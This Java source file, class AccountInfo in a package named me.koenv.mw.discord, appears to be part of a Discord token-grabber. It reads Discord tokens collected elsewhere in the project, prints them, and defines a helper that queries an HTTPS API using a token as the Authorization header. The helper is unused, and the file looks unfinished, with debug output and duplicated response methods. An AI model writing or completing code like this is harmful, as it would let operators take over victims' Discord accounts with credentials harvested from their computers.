package me.koenv.mw.discord;

import me.koenv.mw.DesktopInfo;
import me.koenv.mw.Main;
import me.koenv.mw.utils.NetworkUtils;
import org.json.JSONObject;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class AccountInfo {

    private Main main = Main.getMain();
    private DesktopInfo DI = Main.getDesktopInfo();
    private Tokens dcTokens = Main.getDcTokens();

    private JSONObject jsonData;


    public void run() {
    String[] tokens = dcTokens.getSb().toString().split("\\n");

    for(String s: tokens) {
        System.out.println(s + "\n\n\nd\n\n");
        }
    }


    private static String getFromAPI(final String route, final String token) {

        // StringBuilder in which the response of the method will be put.
        final StringBuilder response = new StringBuilder();

        // Create a new thread, as networking is not allowed on the main thread.
        final Thread thread = new Thread(() -> {
            // Creating HttpURLConnection variable for later usage
            HttpsURLConnection con = null;
            try {
                // Instantiate new URL with our route variable.
                URL url = new URL(route);
                // Instantiate our HttpURLConnection variable with our URL variable.
                // After instantiating, we set its properties.
                con = (HttpsURLConnection) url.openConnection();
                con.setRequestMethod("GET");
                con.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
                con.setRequestProperty("Accept","application/json");
                con.setRequestProperty("Authorization", token);
                con.setDoInput(true);
                con.setConnectTimeout(2000);
                con.setReadTimeout(2000);

                // If the connection returns a HTTP_OK (200) or HTTP_BAD_REQUEST (400) response code.
                // Then we will read it's response message by appending each new line to our StringBuilder
                getResponse(con, response);

            } catch (IOException e) {
                e.fillInStackTrace();
            } finally {
                if (con != null) {
                    con.disconnect();
                }
            }
        });
        thread.start();
        try {
            thread.join();
            return response.toString();
        } catch (InterruptedException e) {
            e.printStackTrace();
            return null;
        }
    }

    private static void getResponse(HttpURLConnection con, StringBuilder response) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), StandardCharsets.UTF_8));
        String responseLine;
        while ((responseLine = br.readLine()) != null){
            response.append(responseLine.trim());
        }
    }

    private static void getResponse(HttpsURLConnection con, StringBuilder response) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), StandardCharsets.UTF_8));
        String responseLine;
        while ((responseLine = br.readLine()) != null){
            response.append(responseLine.trim());
        }

    }

}
